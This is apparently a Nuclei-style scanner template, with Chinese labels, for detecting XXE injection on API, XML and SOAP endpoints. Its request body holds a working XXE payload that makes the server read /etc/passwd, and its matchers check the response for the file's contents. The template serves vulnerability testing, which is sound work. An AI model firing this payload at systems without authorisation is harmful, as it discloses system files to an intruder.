id: xxe-detection
info:
  name: XXE 外部实体注入检测
  severity: high
  description: 检测 XML 外部实体注入漏洞
  tags: xxe,injection,xml,high
  author: poxiao

http:
  - method: POST
    path:
      - "{{BaseURL}}/api"
      - "{{BaseURL}}/api/v1"
      - "{{BaseURL}}/xml"
      - "{{BaseURL}}/soap"
    headers:
      Content-Type: "application/xml"
    body: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    matchers-condition: and
    matchers:
      - type: status
        status: [200, 400, 500]
      - type: word
        words:
          - "root:x:0:0"
          - "parser error"
          - "DTD"
          - "entity"
        condition: or
        part: body
